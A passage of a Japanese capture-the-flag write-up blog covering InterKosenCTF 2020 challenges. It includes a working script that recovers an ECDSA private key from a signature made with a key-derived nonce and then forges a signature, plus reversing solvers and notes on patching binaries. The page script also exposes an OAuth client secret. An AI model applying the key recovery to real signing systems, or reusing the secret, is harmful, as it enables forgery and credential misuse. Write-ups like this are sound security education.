+<p>実はこの問題のシグネチャは，17行目の$k$の値に脆弱性があります．本来の楕円曲線のシグネチャは乱数をかける必要がありますが，この問題では秘密鍵$d$がかけられています，そのため適当な平文とそのシグネチャがわかっていれば秘密鍵の値を計算することができ，&ldquo;ochazuke&quot;のシグネチャも簡単に求まってしまいます．</p>
+<p>具体的には，$d = \frac{m}{hash \cdot s - r} \mod n$です．というわけでそるばどぺー</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">from Crypto.Util.number import bytes_to_long
+from binascii import unhexlify
+from hashlib import sha1
+
+EC = EllipticCurve(
+    GF(0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff),
+    [-3, 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b]
+)
+n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 # EC.order()
+Zn = Zmod(n)
+G = EC((0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
+        0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5))
+
+msg = b&#34;ohayougozaimasu&#34;
+
+print(&#34;ohayougozaimasu_hash&#34;)
+r = ZZ(input(&#34;r: &#34;))
+s = ZZ(input(&#34;s: &#34;))
+h = Zn(ZZ(sha1(msg).hexdigest(), 16))
+
+d = (bytes_to_long(msg) * (h * s - r) ** (-1)) % n
+
+print(&#34;d: {}&#34;.format(d))
+# d = 313681195146870630150443675574660225833
+
+
+def sign(private_key, message):
+    z = Zn(bytes_to_long(message))
+    k = Zn(ZZ(sha1(message).hexdigest(), 16)) * private_key
+    assert k != 0
+    K = ZZ(k) * G
+    r = Zn(K[0])
+    assert r != 0
+    s = (z + r * private_key) / k
+    assert s != 0
+    return (r, s)
+
+target = b&#34;ochazuke&#34;
+r, s = sign(d, target)
+print()
+print(&#34;ochazuke_signature&#34;)
+print(&#34;r: {}&#34;.format(r))
+print(&#34;s: {}&#34;.format(s))
+
+# KosenCTF{ahhhh_ochazuke_oisi_geho!geho!!gehun!..oisii...}
+</code></pre></td></tr></table>
+</div>
+</div><p>your messageにhexlify(b&quot;ohayougozaimasu&rdquo;)を送り，そのシグネチャをこの計算プログラムに入力すればochazukeのシグネチャが計算されます．この問題，あまり楕円曲線要素がなくただの法の下の計算みたいな感じだったので少し残念でした．でも面白かったです！</p>
+<br>
+<h1 id="reversing-182pts-harmagedon-36-solved">[reversing: 182pts] harmagedon (36 solved)</h1>
+<p>ELFのバイナリが与えられます．実行するとwhich is your choice? [fRD3]みたいな感じで何度も聞かれ，正しいアルファベットを選択していくとフラグが手に入るプログラムです．</p>
+<p>頑張ってバイナリを読むと，$i$番目に選択したアルファベットのインデックス(例えば[fRd3]でRなら1)を$a_i$とすると，次のような漸化式と制約でフラグかどうか判別しているようでした．</p>
+<p>$$x_1 = 0,\ x_{i+1} = 4(x_i + a_i + 1)$$
+$$\exists j \leq 11,\ x_j = 12024956$$</p>
+<p>$j = 11$と予想して次のソルバで$a_i$を求めていきました．</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">calc</span><span class="p">(</span><span class="n">ps</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ps</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">ps</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">calc</span><span class="p">(</span><span class="n">ps</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span> <span class="o">+</span> <span class="n">ps</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                        <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                            <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                                    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                                        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                                            <span class="n">xxx</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">h</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">k</span><span class="p">]</span>
+                                            <span class="n">m</span> <span class="o">=</span> <span class="n">calc</span><span class="p">(</span><span class="n">xxx</span><span class="p">[::])</span>
+                                            <span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+                                            <span class="k">if</span> <span class="n">m</span> <span class="o">==</span> <span class="mh">0xb77c7c</span><span class="p">:</span>
+                                                <span class="k">print</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">xxx</span><span class="p">)))</span>
+                                                <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="c1"># [1, 2, 0, 2, 0, 2, 1, 3, 0, 2, 2]</span>
+<span class="c1"># KosenCTF{Ruktun0rDi3}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h1 id="reversing-182pts-in-question-36-solved">[reversing: 182pts] in question (36 solved)</h1>
+<p>ELFのバイナリが与えられています．コマンドライン引数にフラグを入力し，それがあってるか判別してくれるようです．頑張ってバイナリを読んでpythonでシミュレートすればフラグが取れます．</p>
+<p>そるばどぺー</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">datas</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">]</span>
+
+<span class="n">flags</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&#34;K&#34;</span><span class="p">)]</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">datas</span><span class="p">)):</span>
+    <span class="n">flags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">flags</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">^</span><span class="n">datas</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">i</span><span class="o">^</span><span class="mh">0xff</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+
+<span class="c1"># KosenCTF{d0nt_l3t_th4t_f00l_u}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h1 id="reversing-252pts-trilemma-26-solved">[reversing: 252pts] trilemma (26 solved)</h1>
+<p>複数の共有ライブラリとソースコードが渡されます．ソースコードにはそのコンパイル方法も記載されていて丁寧だと感じました．<br>
+実行してみると各ライブラリのflag関数からエラーが出ます．エラーの文章からdl_iterate_phdrとlookupで落ちているようでした，ということで各ライブラリのlookup関数の中身を編集し，ライブラリの存在の有無でデータに1を書き込んでいる部分を0を書き込むように直しました．これは直接バイナリエディタでアセンブリをいじっています．</p>
+<p>また，その後実行してもまたエラーで落ちます．そのエラーは，先程のエラーを回避するために0を代入したのに，そのデータの値が0であるときに発生するエラーでした．ということでそのジャンプ命令を変更してあげてそこもパスできるように編集しました．</p>
+<p>その後またエラーが発生します．フラグを生成する部分のバッファのアドレスをmmapするとき，各ライブラリが使う部分が競合してしまっていました．gdbで頑張って色々命令を飛ばしながら動かすとフラグの断片が色々手に入るので，それを組みわせればオッケーです．</p>
+<p>フラグは忘れちゃいました．</p>
+</div>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">mitsu</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2020-09-07
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/blog/tags/writeup/">writeup</a>
+          <a href="/blog/tags/kosen/">kosen</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/blog/post/post2/wmctf/">
+            <span class="next-text nav-default">WMCTF 2020 writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="comments-gitment"></div>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/default.min.css" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/gitment.browser.min.js" crossorigin="anonymous"></script>
+    <script type="text/javascript">
+      var gitment = new Gitment({
+        id: '2020-09-07 01:14:23 \u002b0900 JST',
+        title: 'InterKosenCTF2020',
+        link: decodeURI(location.href),
+        desc: 'InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめ',
+        owner: 'mitsu1119',
+        repo: 'blog',
+        oauth: {
+          client_id: 'f3e7c8f4a2b837358387',
+          client_secret: 'b97e73a33a1d3893bfbec97af19d35d15faa9752'
+        }
+      });
+      gitment.render('comments-gitment');
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/imsun/gitment">comments powered by gitment.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://twitter.com/meowricator" class="iconfont icon-twitter" title="twitter"></a>
+      <a href="https://github.com/mitsu1119" class="iconfont icon-github" title="github"></a>
+  <a href="https://mitsu1119.github.io/blog/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2017 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">mitsu</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/blog/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      TeX: {equationNumbers: {autoNumber: "AMS"}},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
